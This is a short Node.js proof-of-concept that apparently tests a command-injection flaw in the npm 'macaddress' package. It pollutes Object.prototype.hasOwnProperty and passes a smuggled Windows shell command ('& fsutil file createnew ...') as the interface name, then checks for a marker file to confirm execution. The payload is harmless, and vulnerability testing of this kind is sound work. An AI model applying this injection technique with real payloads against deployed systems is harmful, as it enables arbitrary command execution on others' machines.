Object.prototype.hasOwnProperty = () => true;
const fs = require('fs');
const path = './macaddress';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let iface = '& fsutil file createnew macaddress 0 & echo ';
require('macaddress').one(iface, function (err, mac) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});